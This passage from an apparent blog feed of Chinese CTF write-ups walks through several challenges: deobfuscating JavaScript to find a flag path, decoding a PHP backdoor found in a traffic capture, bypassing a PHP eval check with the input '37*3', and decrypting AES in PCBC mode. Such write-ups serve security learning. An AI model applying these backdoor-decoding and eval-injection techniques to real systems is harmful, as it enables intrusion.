class="hljs-string">&quot;\x20cps&quot;</span>,<br><span class="hljs-string">&quot;clicks&quot;</span>,<br><span class="hljs-string">&quot;\x20Your\x20Reward\x20:\x20&lt;a\x20href=\x22&quot;</span> +<br><span class="hljs-string">&quot;2f2e736563726574696f6e2f666c6167&quot;</span><br>.match(/[\da-f]&#123;<span class="hljs-number">2</span>&#125;/gi)<br>.<span class="hljs-built_in">map</span>((h) =&gt; String.fromCharCode(parseInt(h, <span class="hljs-number">16</span>)))<br>.join(<span class="hljs-string">&quot;&quot;</span>) +<br><span class="hljs-string">&quot;\x22\x20download=\x22flag\x22&gt;Reward&lt;/a&gt;&quot;</span>,<br><span class="hljs-string">&quot;3526ccMajJ&quot;</span>,<br><span class="hljs-string">&quot;innerHTML&quot;</span>,<br><span class="hljs-string">&quot;4263236HVNRoh&quot;</span>,<br><span class="hljs-string">&quot;3656895VkgrIX&quot;</span>,<br><span class="hljs-string">&quot;503210VEeXpc&quot;</span>,<br><span class="hljs-string">&quot;toFixed&quot;</span>,<br><span class="hljs-string">&quot;5NfzyuJ&quot;</span>,<br><span class="hljs-string">&quot;8399912tBbEFu&quot;</span>,<br><span class="hljs-string">&quot;SCORE:\x20&quot;</span>,<br><span class="hljs-string">&quot;6379703kdfIqT&quot;</span>,<br><span class="hljs-string">&quot;getElementById&quot;</span>,<br><span class="hljs-string">&quot;getTime&quot;</span>,<br><span class="hljs-string">&quot;48bKPhCj&quot;</span>,<br><span class="hljs-string">&quot;14Xmxuhh&quot;</span>,<br><span class="hljs-string">&quot;reward&quot;</span>,<br><span class="hljs-string">&quot;9wOTYQU&quot;</span>,<br><span class="hljs-string">&quot;597OMUzhx&quot;</span>,<br><span class="hljs-string">&quot;2046510XnQiaG&quot;</span>,<br>];<br>_0x59a2 = function () &#123;<br><span class="hljs-keyword">return</span> _0x78411b;<br>&#125;;<br><span class="hljs-keyword">return</span> _0x59a2();<br>&#125;<br> <br></code></pre></td></tr></table></figure><p>看起来”\x20Your\x20Reward\x20:\x20&lt;a\x20href=\x22” +<br>            “2f2e736563726574696f6e2f666c6167”<br>这段是回显rewaard也就是flag的<br>一开始以为要解这个 2f2e736563726574696f6e2f666c6167<br>发现不行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">_0x59a2 = function () &#123;<br><span class="hljs-keyword">return</span> _0x78411b;<br>&#125;;<br><span class="hljs-keyword">return</span> _0x59a2();<br>&#125;<br></code></pre></td></tr></table></figure><p>看到这，可以运行_0x59a2()这个函数<br><img src="/mdimg/bbctf/8.png"><br>得到flag的地址<code>/.secretion/flag</code><br>访问下载打开<br><img src="/mdimg/bbctf/9.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022年春秋杯网络安全联赛 冬季赛-wp</title>
    <link href="/2023/02/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%20%E5%86%AC%E5%AD%A3%E8%B5%9B-wp/"/>
    <url>/2023/02/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%20%E5%86%AC%E5%AD%A3%E8%B5%9B-wp/</url>
    
    <content type="html"><![CDATA[<h2 id="misc—nan’s-analysis"><a href="#misc—nan’s-analysis" class="headerlink" title="misc—nan’s analysis"></a>misc—nan’s analysis</h2><p><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/1.png"><br><strong>一眼丁真要流量分析找root密码</strong><br><strong>wireshark打开流量包，检索password找到一个包</strong><br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/2.png"></p><blockquote><p>keyisChunqiuGame00504</p></blockquote><p>翻找流量包发现有shell.php文件，可能有后门<br>然后在终端读这个文件<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/3.png"><br>应该是零宽隐写，用下面这个网站解<br><a href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a><br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/4.png"><br>:::success<br>压缩密码格式’abac’*4，abac为纯数字形如1213，此密码与root密码有关<br>前面找到一个密码ChunqiuGame00504<br>猜测可能是0504 *4<br> 0504050405040504<br>:::<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/5.png"><br>找到一个文件上传的的地方，打开康康<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/6.png"><br>他把上传的后门给加密了，eval的时候会执行解密，直接改成echo把结果打印出来<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/7.png"><br>再跑一遍<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/8.png"><br>:::success<br>/8MARVmEAnfKntdp2/HP0w==<br>这个就是加密的root密码的密文<br>:::<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/9.png"><br>上号，拿flag<br><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/10.png"></p><h2 id="web—-ezphp"><a href="#web—-ezphp" class="headerlink" title="web— ezphp"></a>web— ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$num </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$num</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">5</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>,<span class="hljs-string">&#x27;111&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>,<span class="hljs-string">&#x27;0&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return 111===$&#123;num&#125;;&quot;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>参考：(<a href="https://www.cnblogs.com/chengd/p/7803664.html">https://www.cnblogs.com/chengd/p/7803664.html</a>)<br>:::tips<br>is_string($num)   //检查参数num是否为字符串<br>:::<br>:::info<br> strlen($num) &lt; 5   //参数num的长度要小于5<br>:::</p><blockquote><p> strpos($num,’111’) === false &amp;&amp; strpos($num,’0’) === false   //字符串里面不能含有111和0</p></blockquote><blockquote><p> eval(“return 111===${num};”)    //eval执行，要求(“return 111===${num};”)的返回值为true</p></blockquote><p> 满足以上条件就读取flag<br>关键在于 “return 111===${num};”    //${num}=$num<br>字符串里不允许有111，又要它等于111<br>一开始想到加减乘除，尝试加减无果，除法好像会超长度<br>用乘法：37x3=111</p><p>?num=37*3</p><p><img src="/mdimg/%E6%98%A5%E7%A7%8B%E6%9D%AF/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NepnepxCATCTF</title>
    <link href="/2023/02/09/NepnepxCATCTF/"/>
    <url>/2023/02/09/NepnepxCATCTF/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/NepnepxCATCTF/CATCTF.png"></p><p><a name="ceHvQ"></a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><p><a name="rgliv"></a></p><h3 id="ez-js"><a href="#ez-js" class="headerlink" title="ez_js"></a>ez_js</h3><p><img src="/mdimg/NepnepxCATCTF/1.png"><br /><img src="/mdimg/NepnepxCATCTF/2.png"><br><a name="lLkVy"></a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p><a name="whfyc"></a></p><h3 id="cat’s-gift"><a href="#cat’s-gift" class="headerlink" title="cat’s gift"></a>cat’s gift</h3><p><img src="/mdimg/NepnepxCATCTF/3.png"><br>:::tips<br><strong>1 - 1/3 + 1/5 - 1/7 + …  是求Π/4 近似值的c语言算法     分成4份，所以是派(pie)</strong><br>:::<br> CatCTF{pie}<br><a name="cXq7p"></a></p><h3 id="盖茨比"><a href="#盖茨比" class="headerlink" title="盖茨比"></a>盖茨比</h3><p><img src="/mdimg/NepnepxCATCTF/4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> copy <span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> data<br><br>iv=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]) <br>iva=copy(iv)<br>key=<span class="hljs-built_in">bytes</span>([randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">8</span>-<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>data=pad(data,<span class="hljs-number">16</span>)<br>c=<span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">16</span>):<br>    s=data[i:i+<span class="hljs-number">16</span>].ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>    c+=cipher.encrypt(xor(s,iv))<br>    iv=xor(s,c[-<span class="hljs-number">16</span>:])<br><br><br>key=b64encode(key)<br>c=b64encode(c)<br><br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-built_in">print</span>(c)<br><br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span><br><span class="hljs-string">b&#x27;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&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p>:::tips<br>这段代码实现了对明文数据进行加密，并使用了 AES 加密算法，使用了 ECB 模式。<br />它先生成了一个 16 字节的随机密钥和一个 16 字节的随机初始化向量 (IV)。然后使用这个密钥和 IV 初始化一个 AES 加密器。接着，它对明文数据进行补齐，使其长度是 16 的倍数，并将明文分块。每一块都使用相同的密钥进行加密，但是使用的 IV 是加密的前一块的输出与当前块的异或。<br />最后，将加密的密钥和密文进行 base64 编码，并输出。<br>:::</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor <span class="hljs-keyword">as</span> xor<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 将密钥和密文 base64 解码</span><br>key = b64decode(<span class="hljs-string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;</span>)<br>ciphertext = b64decode(<span class="hljs-string">b&#x27;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&#x27;</span><br>)<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>c2 = [ciphertext[i:i+<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ciphertext),<span class="hljs-number">16</span>)]<br>xor_s = []<br>xor_iv = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> ciphertext <span class="hljs-keyword">in</span> c2:<br>    xor_s.append(cipher.decrypt(ciphertext))<br>    <br>s = <span class="hljs-string">b&#x27;&#x27;</span><br>tiv = <span class="hljs-string">b&#x27;\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30&#x27;</span> <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">0x99</span>]:<br>    iv = tiv+long_to_bytes(j)<br>    trycry = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(xor_s)):<br>        s = xor(xor_s[i], iv)<br>        iv = xor(s, c2[i])<br>        <span class="hljs-keyword">try</span>:<br>            trycry += s.decode()<br>            <span class="hljs-keyword">if</span> trycry[-<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> printable:<br>                <span class="hljs-keyword">break</span><br>            trycry += <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> trycry:   <span class="hljs-comment">#查找关键字flag</span><br>        <span class="hljs-built_in">print</span>(trycry)<br>        <span class="hljs-comment">#flag&#123;This&#x27;s_why_PCBC_is_not_living&#125;</span><br></code></pre></td></tr></table></figure><p><a name="wEvbq"></a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p><a name="CdyBq"></a></p><h3 id="CatCat"><a href="#CatCat" class="headerlink" title="CatCat"></a>CatCat</h3><p>图片010打开检索password出密码  catflag<br />然后rabbit密码解密，密钥为catflag<br />然后base91解码<br />最后Ook解码<br /><img 